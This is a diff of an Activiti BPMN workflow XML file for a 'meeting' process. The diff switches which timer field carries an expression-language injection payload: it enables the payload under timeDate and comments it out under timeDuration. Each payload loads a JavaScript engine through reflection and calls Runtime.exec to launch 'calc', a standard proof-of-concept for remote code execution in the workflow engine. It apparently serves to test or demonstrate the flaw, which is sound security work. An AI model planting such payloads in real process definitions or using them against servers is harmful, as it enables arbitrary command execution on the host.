@@ -8,15 +8,15 @@
     <process id="meeting" name="meeting" isExecutable="true">
         <startEvent id="startEvent1" name="Start" activiti:initiator="host">
             <timerEventDefinition>
-                <!--                <timeDate>-->
-                <!--                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}-->
-                <!--                </timeDate>-->
+                <timeDate>
+                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
+                </timeDate>
                 <!--                <timeCycle>-->
                 <!--                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){return java.lang.Runtime.getRuntime().exec(\'calc\')};test()')}-->
                 <!--                </timeCycle>-->
-                <timeDuration>
-                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
-                </timeDuration>
+                <!--                <timeDuration>-->
+                <!--                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}-->
+                <!--                </timeDuration>-->
             </timerEventDefinition>
         </startEvent>
         <userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
